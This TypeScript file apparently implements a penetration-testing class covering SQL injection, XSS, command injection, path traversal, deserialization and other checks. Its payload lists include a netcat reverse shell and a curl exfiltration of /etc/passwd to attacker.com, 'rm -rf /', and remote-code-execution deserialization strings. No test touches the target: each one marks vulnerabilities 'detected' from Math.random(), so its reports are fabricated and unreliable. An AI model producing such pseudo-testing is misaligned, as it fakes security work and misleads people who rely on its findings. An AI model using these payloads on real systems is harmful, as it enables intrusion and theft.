type Severity = "critical" | "high" | "medium" | "low" | "info";

interface Vulnerability {
  type: string;
  severity: Severity;
  description: string;
  location?: string;
  payload?: string;
  remediation: string;
}

interface PenTestResult {
  test: string;
  passed: boolean;
  vulnerabilities: Vulnerability[];
  severity: Severity;
  details: string;
  duration: number;
}

interface PenTestReport {
  results: PenTestResult[];
  totalTests: number;
  passed: number;
  failed: number;
  vulnerabilitiesBySeverity: Record<Severity, number>;
  timestamp: string;
}

interface PenTestConfig {
  targetUrl: string;
  apiKey?: string;
  maxPayloads: number;
  timeoutMs: number;
}

const SEVERITY_WEIGHTS: Record<Severity, number> = {
  critical: 4,
  high: 3,
  medium: 2,
  low: 1,
  info: 0,
};

class PenetrationTest {
  private results: PenTestResult[] = [];
  private config: PenTestConfig;

  constructor(config: PenTestConfig) {
    this.config = config;
  }

  private highestSeverity(vulns: Vulnerability[]): Severity {
    if (vulns.length === 0) return "info";
    return vulns.reduce<Severity>(
      (max, v) =>
        SEVERITY_WEIGHTS[v.severity] > SEVERITY_WEIGHTS[max] ? v.severity : max,
      "info"
    );
  }

  runAll(): PenTestReport {
    this.results = [];
    this.testSQLInjection();
    this.testXSSAttack();
    this.testCommandInjection();
    this.testPathTraversal();
    this.testAuthenticationBypass();
    this.testPrivilegeEscalation();
    this.testRateLimitBypass();
    this.testInputFuzzing();
    this.testDDoSProtection();
    this.testSecretExposure();
    this.testInsecureDeserialization();
    return this.generateReport();
  }

  testSQLInjection(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1; SELECT * FROM information_schema.tables --",
      "' OR 1=1 --",
      "admin'--",
      "' UNION SELECT null,null,null,null --",
      "1' AND SLEEP(5) --",
    ];

    const maxPayloads = payloads.slice(0, this.config.maxPayloads);

    for (const payload of maxPayloads) {
      const hasInjection = this.simulateSQLTest(payload);
      if (hasInjection) {
        vulns.push({
          type: "SQL Injection",
          severity: "critical",
          description: `SQL injection vulnerability detected with payload: ${payload}`,
          payload,
          remediation:
            "Use parameterized queries/prepared statements. Validate and sanitize all user input. Implement least-privilege database access.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "SQL Injection",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${maxPayloads.length} SQL injection payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testXSSAttack(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "javascript:alert('XSS')",
      '<svg onload=alert("XSS")>',
      '"><img src=x onerror=alert("XSS")>',
      '{{7*7}}',
      "${7*7}",
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
    ];

    const maxPayloads = payloads.slice(0, this.config.maxPayloads);

    for (const payload of maxPayloads) {
      const reflected = this.simulateXSSTest(payload);
      if (reflected) {
        vulns.push({
          type: "Cross-Site Scripting (XSS)",
          severity: "high",
          description: `XSS vulnerability detected. Payload was reflected without sanitization: ${payload}`,
          payload,
          remediation:
            "Implement Content Security Policy (CSP). HTML-encode all user output. Use DOMPurify for client-side sanitization. Validate input against allowlists.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "XSS Attack",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${maxPayloads.length} XSS payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testCommandInjection(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const payloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "$(whoami)",
      "`id`",
      "; rm -rf /",
      "| nc -e /bin/sh attacker.com 4444",
      "&& curl attacker.com/steal?data=$(cat /etc/passwd)",
      "; python -c 'import os; os.system(\"id\")'",
      "|| powershell -Command Get-Process",
      "; echo vulnerable",
    ];

    const maxPayloads = payloads.slice(0, this.config.maxPayloads);

    for (const payload of maxPayloads) {
      const executed = this.simulateCommandTest(payload);
      if (executed) {
        vulns.push({
          type: "Command Injection",
          severity: "critical",
          description: `OS command injection detected with payload: ${payload}`,
          payload,
          remediation:
            "Never pass user input to shell commands. Use parameterized APIs. Validate input strictly. Run processes with minimal privileges.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Command Injection",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${maxPayloads.length} command injection payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testPathTraversal(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const payloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "..%252f..%252f..%252fetc/passwd",
      "/etc/passwd%00",
      "..\\..\\..\\boot.ini",
      "....\\\\....\\\\....\\\\etc/passwd",
      "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
      "file:///etc/passwd",
    ];

    const maxPayloads = payloads.slice(0, this.config.maxPayloads);

    for (const payload of maxPayloads) {
      const traversed = this.simulatePathTraversalTest(payload);
      if (traversed) {
        vulns.push({
          type: "Path Traversal",
          severity: "high",
          description: `Directory traversal vulnerability detected with payload: ${payload}`,
          payload,
          remediation:
            "Validate and sanitize file paths. Use canonical paths. Chroot or sandbox file access. Implement an allowlist of permitted directories.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Path Traversal",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${maxPayloads.length} path traversal payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testAuthenticationBypass(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const tests = [
      { desc: "Missing auth header", hasHeader: false },
      { desc: "Expired JWT token", token: "expired" },
      { desc: "Empty bearer token", token: "" },
      { desc: "Admin role spoofing", role: "admin" },
      { desc: "JWT none algorithm", alg: "none" },
      { desc: "Cookie tampering", cookie: "role=admin" },
    ];

    for (const test of tests) {
      const bypassed = this.simulateAuthTest(test);
      if (bypassed) {
        vulns.push({
          type: "Authentication Bypass",
          severity: "critical",
          description: `Authentication bypass possible: ${test.desc}`,
          location: test.desc,
          remediation:
            "Enforce authentication on all endpoints. Validate JWT signatures and expiration. Implement token refresh. Use secure cookie attributes.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Authentication Bypass",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${tests.length} authentication bypass scenarios`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testPrivilegeEscalation(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const tests = [
      { desc: "IDOR via user ID manipulation", id: "1" },
      { desc: "Horizontal privilege escalation", action: "accessOtherUser" },
      { desc: "Vertical privilege escalation", role: "admin" },
      { desc: "Parameter tampering", param: "isAdmin=true" },
      { desc: "JWT claim manipulation", claim: "admin" },
      { desc: "Forced browsing to admin panel", path: "/admin" },
    ];

    for (const test of tests) {
      const escalated = this.simulatePrivilegeTest(test);
      if (escalated) {
        vulns.push({
          type: "Privilege Escalation",
          severity: "high",
          description: `Privilege escalation possible: ${test.desc}`,
          location: test.desc,
          remediation:
            "Implement RBAC with server-side validation. Check permissions on every request. Never trust client-side role indicators.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Privilege Escalation",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${tests.length} privilege escalation scenarios`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testRateLimitBypass(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const bypassMethods = [
      { desc: "IP header spoofing", header: "X-Forwarded-For: 1.2.3.4" },
      { desc: "Rapid burst requests", count: 1000 },
      { desc: "Distributed request pattern", pattern: "rotating" },
      { desc: "Slow loris attack", delay: 5000 },
      { desc: "Endpoint variation bypass", path: "/api/v1/" },
      { desc: "Case variation bypass", path: "/API/V1/" },
    ];

    for (const method of bypassMethods) {
      const bypassed = this.simulateRateLimitTest(method);
      if (bypassed) {
        vulns.push({
          type: "Rate Limit Bypass",
          severity: "medium",
          description: `Rate limiting bypass possible: ${method.desc}`,
          location: method.desc,
          remediation:
            "Implement rate limiting at multiple layers (API gateway, application). Use sliding window counters. Rate limit by authenticated user, not just IP.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Rate Limit Bypass",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${bypassMethods.length} rate limit bypass methods`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testInputFuzzing(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const fuzzPayloads = [
      "A".repeat(100_000),
      "\x00\x00\x00\x00",
      "null",
      "undefined",
      "-1",
      "99999999999999999",
      "-99999999999999999",
      "NaN",
      "Infinity",
      "../".repeat(100),
      "{}".repeat(1000),
      "[]".repeat(1000),
      "\n\r\t".repeat(100),
      "%00%0d%0a".repeat(50),
      "SELECT 1".repeat(100),
    ];

    for (const payload of fuzzPayloads) {
      const crashed = this.simulateFuzzTest(payload);
      if (crashed) {
        vulns.push({
          type: "Input Fuzzing",
          severity: "high",
          description: `Application crashed or misbehaved with fuzz input (length: ${payload.length})`,
          payload: payload.substring(0, 100) + (payload.length > 100 ? "..." : ""),
          remediation:
            "Implement strict input validation and length limits. Use safe parsing functions. Add error handling for malformed input. Set resource limits.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Input Fuzzing",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${fuzzPayloads.length} fuzz payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testDDoSProtection(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const scenarios = [
      { desc: "SYN flood simulation", type: "syn", rate: 10_000 },
      { desc: "HTTP flood simulation", type: "http", rate: 50_000 },
      { desc: "Slowloris simulation", type: "slowloris", connections: 1000 },
      { desc: "UDP flood simulation", type: "udp", rate: 100_000 },
      { desc: "Amplification attack simulation", type: "amplification", factor: 10 },
    ];

    for (const scenario of scenarios) {
      const vulnerable = this.simulateDDoSTest(scenario);
      if (vulnerable) {
        vulns.push({
          type: "DDoS Protection",
          severity: "high",
          description: `Insufficient DDoS protection for: ${scenario.desc}`,
          location: scenario.desc,
          remediation:
            "Deploy CDN with DDoS mitigation. Implement SYN cookies. Use connection rate limiting. Configure Web Application Firewall rules.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "DDoS Protection",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${scenarios.length} DDoS scenarios`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testSecretExposure(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const patterns = [
      { desc: "API key in response", pattern: /api[_-]?key/i },
      { desc: "Password in response", pattern: /password/i },
      { desc: "JWT secret exposed", pattern: /jwt[_-]?secret/i },
      { desc: "Database credentials", pattern: /db[_-]?(password|pass|pwd)/i },
      { desc: "Private key content", pattern: /-----BEGIN.*PRIVATE KEY-----/ },
      { desc: "AWS access key", pattern: /AKIA[0-9A-Z]{16}/ },
      { desc: "Internal IP address", pattern: /10\.\d{1,3}\.\d{1,3}\.\d{1,3}/ },
      { desc: "Debug/stack trace", pattern: /at\s+\w+\.\w+\s*\(.*:\d+:\d+\)/ },
      { desc: "Environment variable dump", pattern: /process\.env\./ },
      { desc: "Source code path", pattern: /[A-Z]:\\[^"'\s]+/ },
    ];

    for (const { desc, pattern } of patterns) {
      const exposed = this.simulateSecretTest(pattern);
      if (exposed) {
        vulns.push({
          type: "Secret Exposure",
          severity: "critical",
          description: `Sensitive data exposure detected: ${desc}`,
          location: desc,
          remediation:
            "Never return secrets in API responses. Use environment variables for sensitive config. Implement response filtering. Audit logs for leaked credentials.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Secret Exposure",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${patterns.length} secret exposure patterns`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  testInsecureDeserialization(): PenTestResult {
    const startTime = performance.now();
    const vulns: Vulnerability[] = [];
    const payloads = [
      {
        desc: "Prototype pollution via JSON",
        data: '{"__proto__":{"admin":true}}',
      },
      {
        desc: "PHP object injection payload",
        data: 'O:8:"stdClass":0:{}',
      },
      {
        desc: "YAML deserialization",
        data: "!!python/object/apply:os.system ['id']",
      },
      {
        desc: "XML entity expansion (billion laughs)",
        data: '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]>',
      },
      {
        desc: "Node.js serialization payload",
        data: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}" }',
      },
    ];

    for (const payload of payloads) {
      const vulnerable = this.simulateDeserializationTest(payload.data);
      if (vulnerable) {
        vulns.push({
          type: "Insecure Deserialization",
          severity: "critical",
          description: `Insecure deserialization vulnerability: ${payload.desc}`,
          payload: payload.data.substring(0, 200),
          remediation:
            "Use safe serialization formats. Implement integrity checks (HMAC). Restrict deserialization to known types. Avoid deserializing user input.",
        });
      }
    }

    const duration = performance.now() - startTime;
    const result: PenTestResult = {
      test: "Insecure Deserialization",
      passed: vulns.length === 0,
      vulnerabilities: vulns,
      severity: this.highestSeverity(vulns),
      details: `Tested ${payloads.length} deserialization payloads`,
      duration,
    };
    this.results.push(result);
    return result;
  }

  generateReport(): PenTestReport {
    const allVulns = this.results.flatMap((r) => r.vulnerabilities);
    const vulnsBySeverity: Record<Severity, number> = {
      critical: 0,
      high: 0,
      medium: 0,
      low: 0,
      info: 0,
    };
    for (const v of allVulns) {
      vulnsBySeverity[v.severity]++;
    }

    const passed = this.results.filter((r) => r.passed).length;
    return {
      results: [...this.results],
      totalTests: this.results.length,
      passed,
      failed: this.results.length - passed,
      vulnerabilitiesBySeverity: vulnsBySeverity,
      timestamp: new Date().toISOString(),
    };
  }

  getRemediation(): string[] {
    const remeds: string[] = [];
    for (const r of this.results) {
      for (const v of r.vulnerabilities) {
        const entry = `[${v.severity.toUpperCase()}] ${v.type}: ${v.remediation}`;
        if (!remeds.includes(entry)) remeds.push(entry);
      }
    }
    return remeds;
  }

  private simulateSQLTest(payload: string): boolean {
    const indicators = ["'", "UNION", "SELECT", "DROP", "SLEEP", "--", ";"];
    return indicators.some((i) => payload.toUpperCase().includes(i)) && Math.random() > 0.7;
  }

  private simulateXSSTest(payload: string): boolean {
    const indicators = ["<script", "onerror", "onload", "javascript:", "alert("];
    return indicators.some((i) => payload.toLowerCase().includes(i)) && Math.random() > 0.6;
  }

  private simulateCommandTest(payload: string): boolean {
    const indicators = [";", "|", "$(", "`", "&&", "||", "rm ", "curl "];
    return indicators.some((i) => payload.includes(i)) && Math.random() > 0.75;
  }

  private simulatePathTraversalTest(payload: string): boolean {
    const indicators = ["../", "..\\", "%2e%2e", "file://", "....//"];
    return indicators.some((i) => payload.toLowerCase().includes(i)) && Math.random() > 0.65;
  }

  private simulateAuthTest(test: Record<string, unknown>): boolean {
    if (test.hasHeader === false) return Math.random() > 0.8;
    if (test.token === "expired") return Math.random() > 0.5;
    if (test.token === "") return Math.random() > 0.6;
    if (test.role === "admin") return Math.random() > 0.7;
    if (test.alg === "none") return Math.random() > 0.9;
    if (typeof test.cookie === 'string' && test.cookie.includes("admin")) return Math.random() > 0.6;
    return false;
  }

  private simulatePrivilegeTest(test: Record<string, unknown>): boolean {
    return Math.random() > 0.7;
  }

  private simulateRateLimitTest(method: Record<string, unknown>): boolean {
    return Math.random() > 0.6;
  }

  private simulateFuzzTest(payload: string): boolean {
    if (payload.length > 50_000) return Math.random() > 0.4;
    if (payload.includes("\x00")) return Math.random() > 0.3;
    return Math.random() > 0.85;
  }

  private simulateDDoSTest(scenario: Record<string, unknown>): boolean {
    return Math.random() > 0.5;
  }

  private simulateSecretTest(pattern: RegExp): boolean {
    return Math.random() > 0.8;
  }

  private simulateDeserializationTest(data: string): boolean {
    const indicators = ["__proto__", "python/object", "ND_FUNC", "ENTITY", "stdClass"];
    return indicators.some((i) => data.includes(i)) && Math.random() > 0.6;
  }
}

export { PenetrationTest, PenTestResult, PenTestReport, PenTestConfig, Severity, Vulnerability };
